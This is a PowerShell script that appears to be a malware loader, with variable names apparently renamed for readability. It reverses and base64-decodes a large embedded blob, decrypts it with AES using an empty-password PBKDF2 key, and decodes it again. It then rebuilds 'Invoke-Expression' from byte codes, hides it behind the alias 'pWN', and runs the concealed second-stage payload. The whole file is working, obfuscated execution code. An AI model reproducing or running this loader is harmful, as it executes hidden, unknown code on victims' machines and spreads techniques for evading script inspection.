function getKeyAndVector
{
    param
    (
        [string]$password, [byte[]]$salt
    );

    ${key} = New-Object byte[](32);
    ${vector} = New-Object byte[](16);
    
    ${rfc2898} = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 1000, [System.Security.Cryptography.HashAlgorithmName]::Sha256);
    
    ${key} = ${rfc2898}.GetBytes(32);
    ${vector} = ${rfc2898}.GetBytes(16);

    return @{ k = ${key}; V = ${vector} }
};

function getSecondStageCommands
{
    param
    (
        [string]$encodedStringParam, [string]$emptyStringParam
    );

    ${decodedBase64String} = [System.Convert]::FromBase64String($encodedStringParam);
    ${extractedSalt} = ${decodedBase64String}[0..7];
    ${aesEncodedBlock} = ${decodedBase64String}[8..4295];

    ${keyIV_Pair} = getKeyAndVector -password $emptyStringParam -salt ${extractedSalt};
    ${key} = ${keyIV_Pair}.k;
    ${vector} = ${keyIV_Pair}.V;

    ${aesCryptoProvider} = [System.Security.Cryptography.AES]::Create();
    ${aesCryptoProvider}.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    ${aesCryptoProvider}.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
    
    ${aesCryptoProvider}.Key = ${key};
    ${aesCryptoProvider}.IV = ${vector};
    ${aesDecryptor} = ${aesCryptoProvider}.CreateDecryptor();

    try
    {
        ${aesDecodedBlock} = ${aesDecryptor}.TransformFinalBlock(${aesEncodedBlock}, 0, ${aesEncodedBlock}.Length);
        return [System.Text.Encoding]::Utf8.GetString(${aesDecodedBlock})
    }
    catch
    {
        return $null
    }
};

${encodedString} = "kJW/KVUjYJht5ICJAIJWgRC+9JA44dQ7cbtJkk0OoMvY+MVGApD2wdsTF9FcMmTNDC+I3B12qbJ3VUwQlAvpGc1l3lyIAGWTgoxcq61cvmtcj2ie8vuIucEySlAb5/ycSvoCTMZVfOV3X0CUClBf2AOQr1LVZl47KHklcS0xxQkNrdvVtk1ULYa2DJbL5KU5qtnd7i7EMid/dLRsx8beHkZaSMcx3sgGMgAkFzSag7ZX8dIdfuTRuEbww7EYjCx9bPT6+hcPyIdZwDHw1PTJ32rDUj4vJSWtcVnrr6OjA7E4/Qtw2BZt6XR/Bzch1qeWWcEea3ynYFZOmTR+HzHqz3K3lZsJgr06PXGUzJyF5bjvCOiuws9BP8YbfwSfN8fRwZLxFO+0fCqTa8VI23v8KE5wZ5VbqxELudQeroDu5UD7rSZpKhEchdcBJ7NUM2a/dBWS7sl1IQzyOBfhHSFD0ba0qsyC5q28E7h8R1mSO0BKPyE/xAx3cLEr8kQwYYN2LjNBrXhiBlWe1ux7QxAbjcJmGnFt/saZ3XBBff3aGja3h9BEanIsK1+6e0dqmvO3XvHQOYD0bWnskyJ25UplpHLRCxdT57M6mxnJI5sbu0Ms5CDmjCrIrkg40CRLStXkycDyo3wp4EzRKU1+aO/6aUlzOvQ/CM6zk/NuDPPt3WEcmoE7LF6eAAJjx5Pa2r+qECh1XUwQXm8eqBuvIXlIposHGtYjOTPK0EqVhJ/yaWiSwd5g33iXSek4UBaCcj8vjJ09nBiBscvGFKIXwdW2xsGtB4MQ5/RY1cwxipE+CyC+VpHmX5wMUgcdjc2eL2V33V/8slw3rBxyfKLfO+zDYhcwAI3kr0XgAURL9PdmFPWxikq3NagNV8PemIenOvvxCARqJtp31Sna4M0g6BhRHgcQh2qrZKc+KyJTrFFCprHNziQ+g/2lJZQAolJp885rfBk4SQaISOgkCTIsQ4k/EAJ63FHQGRrJ6JJdVNU6af1VRwQBudy1RosWf1NVlLgJk5YmiJ72sb15egUC4kkkmwM5YG7VKX9BT0GkqaANa8FUnMqFp4HsGyT0MpW7zcLcSrk1JDx0CYRN/YvOHrd2BYvoBTQzp8KNbRKrpKuiswPqmxyZGLEY4UFHWlmH9i7lz0iomhyhMZG9yo9BeNNJsCY1hT00xPAnOUJxQgicnD+wbi/A/0/HcrcbJFPOoHGeRiVyMHnCiHXzR1eJ+Ly10HvutdDmjgnRcrLxdLgAHjcR9g4IUYDOtZVZbUhMxezpwWqWu9m4WN+0tK9nDs94OSdZeoFBXRvkwE4EoAoL5zK+ZQwTAMbBlHpXeoZs9BcyFAbpQ7pJTB4jv2t1DPE0gJLi5eHKmsJPYeuYOmuacMaPMffRae192oLV+HIv6EGE0fno+zanlHDgg/+qWY32GsX9njyiiLK3uTO3PTxrDr1S49AELfS0xLot7XB0ppmX9hKbnxSkolKyzVSRx5toXNUtbK9eRSf/qjtncSCkNK+TmVM9IIX9/s06m0wIvxBEXyoEOli153bQ6dBh0MKpAZMJfC7R4Sx+h3l9ErFr5/3KMEZ/1ziLL76IbIsXqGKSUG6o0tB2L8hqL9IQ2qy4K+LpJFobXLQf0fnL7cCrwfWSK7O2qDlS7WZeqlC2t7cF5kKk2qKdGZWkgSV3vscIhdg1NdtxC1PMpeQYrCikNoYtMiBr3BfL/s4eYky8ExmXa8M6OCMxch0irb5STYdgJM4f/G4J8XhscwXb5XsbfF66wJzSDgKrt/xzBohSHUD8ZvpiBnbivaxitdxhX1082LjN18xCBYuZPtqDLbCBBSO7wOl5Bwo6EpizBU6hdRXgT+dh3fKp8u5cFYMrv8UqRIzh27rqDuN+E1yJNKQzaJ8FYpinydc0zpA1nsq0Y4+81Jk+zgcji91cYaGadT+CA/t4oEJIqz+eRgeZASYDds+wZcRb0t/ldVghJbsxe4TCpAbb/woDXMd/WRipr2Al5KqV7zts42wOYVnqid8i9Pj6HmkxZt51VOhoMjtgviPhNjoNtJTe6qF2NwgdAHOw4b2J+R0IJp/dj2NNS1W/KYZacQicHMWqkI7PwbtcKEdCerMCEA5TGzhwAa8sKHh7sNxHG21RgTzO5o5kkK/msiCfmTmrh6wbfj7W3RAfOhN7B2nY8n+2OcOidjD22UuEv3/LTFreOr079GPapIvo1u7sv8QYRGXYrLpec6HrE0XwssOd0oFVQQ8biHNyO/d7lz/jWyowVP6sEe/Pnwo+fnhcSKkix1enj0WnXVapKMdz8RxajgWl6m4f7RPYRzysDqwqHerQEzHNGFXXRUEgltVkMx67afrdspXm0Oh25xVx3zIuQEXAQCkhkKsMUGJLqdDNwtaY6CeZ+ZaDobSdIYMehYdzaAT/1Yxy4XL7P/JK3oSz1HGlFyqYtnuZDWOOzVJaL/0sLc7HGhrwvD6m+mM14ssXmsQayv4GIGgaRCMi/DgLVyVwLOyET7eA1uGCuYbVPxWJIC2934s68cUF5KmJ1uZpNXmvkmGt/6DIwJygqqTDvAcVPycTH8I4fgiJZDYxczW87sSMG04BZoQciS2NP3hLzTUxZI35LCajDAj0HA4eG7Fd+xQHg7SkLW7SbTb9IW3Uz4/lMz6KgC7/2hIDztf49wCBT151uQN4qI+tdfWWbGq8Tv5px4KkFdpqpHmH9VRhhmV04PWf/ystX8HgzdGls7esbyZZNRiXqQQ+u+aGHaFSQmJqJtpAmrfxjT7iqxmNky6jiVrEquEBo2B7RQThK2Y89SGf6bQfWpGk6jL80ayahv4tISPm9Lh62f3YSaInlH9ioexwrCzftVLOmzE1E43zxdvJs+78BPAKG5zM/oEYDF3BrVt61k9k/dtkzjBAsAaKjK3lSUVgsAkLuvj7tYg3pjAxhIYC0UPOCHT24bAdC7nUHmTtonNy0SWfwpoyGIbOley4b05TxOvVsz/mJuKMKbeEwVVZKVppDReHE79KEf+m5MRBrVbu+LW13+yd03IlzZse5wLNAeRNzjAjx4z9KHCd8EhmOGFfLsPP9ypQ3C2hRLvijbjVDtoMf/ivo5lobUbi4x17xID3ZNhsOu/D2d/G+Ce6di71LSY5SILPKzb83qVDOL+Tf/dUo97NjHFrRy0G8oQiKD9EGnkDKRuop/iVZJfwCbeYm1+d2fDF4VPIdAuZIvQv/NOfpuzVAmNaHV+xcNYDfCF/llavbvYcJXfPmaJjysetPiVkyCcUI3XpMQ54XBwc1lwhLlbJFdSY8WOZfd3GvLE7YSJ4sNsptB+eKGRd0iWn1nu+vDdRvBw6JWNxOtzE8XMty4tOFFfn/0zWjCYD8TpCgkcjsWTVUEhDeEuVCO4bcok1paOVgm7K1bOiEVNcI5rYyDORG+qqGbc+4axkce+7hyO7psz5PQ2o3p+BO0rDducLvOVhfJKo0kPnKBlhS/uAWu4cFnnKlNp2nr/7otkWZ+1HjP/UkGzzpmGRWVvLAyr1PTId68VO6cxhfjbo/y5pCcMmlHN65Lv2GvFk7v0EViNl+5M6TpabYvHp5oJGdtWuyGPjbv//IFSFLajdGiO/BlgWb4mLOLCtj9ECoYAPghTGQ9GbsiqcqdLZWB1UvBrhjlubmcdagas/J4lutVD095lfmJo8semrAFbzdmHjev+wUvlKN/ipNgQZ21vUjrrHCjSyCAe8gpEcUUDh3lUf5yH+Z7dyZ7I3vvPeuAvwfA0tSswXR9txPe4gfxfT9LEZGIqKe6l/aLgnMvoNLM319hrXRYrc6TOOQu3i9xGJ9TsmSi/thECim58dS1nNhdNEuaMrCwNy1B/NFzP20HEwTUeaZInT7A00T8JotZWsprJlUlQW1tWnghlZ+KZCj4n3jv/10lvANbQSfgRA4DX56MAhBm2WpOKZZ5ML6YdcAYPk95fACO5Ed03uYJLVZTfLwtWm4vQ07J2aSowZ5Z3YAyF6ErLrV37pdt5QeAn0BRvc2VOMmyKxraaoUCll++798Xl9xaCg2+lzNWRoskedknXb1BcILdI7s7WYA09tgU0jJpOC7k6bjomi8h+S2nfCBzouInfPgD1CoC9x61wnfKCsfShYk8YrzIjZTYzrtapAufWpl4u3zQuIALfa0xa8KPt1DDH4CppwXLutxGls3g1SvwYGX4Scf+lB3w4ApkIRx2MZZLhK6AXtaJsRjrunfn6XiqBhwhWSV+/8xmKyontvttSl3xiUkUTKVBw+G33N3+BxjgcSLMApccl8MiDo8xn5aqIBFPDXevABor6UTkeMRIGb97m56aFP787x09NDOHzmQLsYI5QkGd8/3fgE2hcsBTSZOjx+o4OC1vaJMAxSjJgdLoQwEzMl+DcRYr1qYU9z/oG7lfQTBO6ETIyoXD8U44jEiwlI5eshJ5bFk0Yb8H8WZIaENPdgowidE70lWCKCc0LVQfQeHxZDsTwfL8unZDTtiANOOjHBOJCDZxNrgB0su5fcmOPRtnz/z1tOgw9uxQJ4Xx3d5rp2G7B2Uj1v0vnxKRNKc0hsdwQvwscEa00eynDeyuykkmjA44/gOeoWpoYTQRa5uzZCc/GLqmhC4wFzakeX1R/sfI5sF6GSyxdwXRy/im0wkvgoBxvw6+4XHzyg/uQiNDQBBNj7yQn5zRKU3A+eAVXZZmUL96G0lme2t6NQXpjkcSwRq5H2SiP1XCL1N08Dn5WXLmEjXcjl1gfCiFxG3EOvELH7quAXEIZgqc835d+7YIj6khbcU48d7ZIikkooT8dIz/ll8RLoaQTmae6OjFhCZPb+8CqyAMnnw+Ng6xkrjgTgJ1UIvEFSAbgHhLd5BTC1HDQIC/5LUyBFBZ/U5SzWXak7sw/vi3/muIXLA3Xsv55072vS+5WP2C5NRkoa/K+j4XQ/iLq2kp1FcL3q53MrLToKd1uHjSCoiZufOelfL70PYpB9xv8WcXUkQA4Uv8c8AB/WpmaLjXLpkNCIL7CxTZFZivjLapbbSHQhr7TSzHjyySYiU+p3PbbaYWlgzDpnkKr5j7UXU7RMEGbkDVvliBjPGUu1HZOd5Z54In75F71YHXacbaFx4NhCDPtppWcGYQIDW2USqPSiqSLCFHm2/2D5LbM4eS76NE/2vRNbhGTe2RKggK6PmD30OFypeJxuOpg4xduvVIuok2Sm5R3+CI4hDr2IZ4wnN9YzGSdgQJVpWnhBE9FFQbN3iqDCBY1lxsPKq1SrBh4gaurJv97LezMuVie+87E7NHFTVt1LuuBBjmuWohRPdnQEqo7XHSMvhggelaT3knzH976ncfbOOLIqLcmm1u4kitYcw0SvMiYSoMduvFVbrt7pWyZQsKveTpaqvYIJAFp7vXOu49vTobXiyIYfCtVm+qcNK6lJLDNBWawGXUwPtwWgQTaBPnEm4uEqbyLTF+JoCEyPtGd3VixCT96MtlqTfj3seMUGlIgYxgo45vSHSttSXxVjQFRtzI1OV0hYCJTMsaXVoBhTKwrGTGSe5w1n1FqHfWgQVe84MfmaJmZpucu3h219+4Ypk1EgNSbX63DknvMqJlm6mGWb5YcWlII/79kE7vpUD4tLyvufUwHIikQFO4mbpxApFr2HlzoaIMLaUnBGTEKGeXS/C9ppx5B5/ydYnKyxp1vpBo3ryexc2ryuSYZTkpXPRSWtTRw3LqXY+0eW/7eGA7PuwSYtzK7+";
${encodedCharArray} = ${encodedString}.ToCharArray();
[Array]::Reverse(${encodedCharArray});

${base64ReversedSecondStage} = getSecondStageCommands -encodedStringParam ${encodedCharArray} -emptyStringPar ([String]::Empty);
${base64SecondStage} = ${base64ReversedSecondStage}.ToCharArray();
[Array]::Reverse(${base64SecondStage});

${secondStageString} = [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String(-join ${base64SecondStage}));

# Invoke-Expression
${invokeExpressionString} = ((([System.Text.Encoding]::Utf8.GetString([byte[]](73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110)))));

New-Alias -Name pWN -Value ${invokeExpressionString} -Force;
pWN ${secondStageString}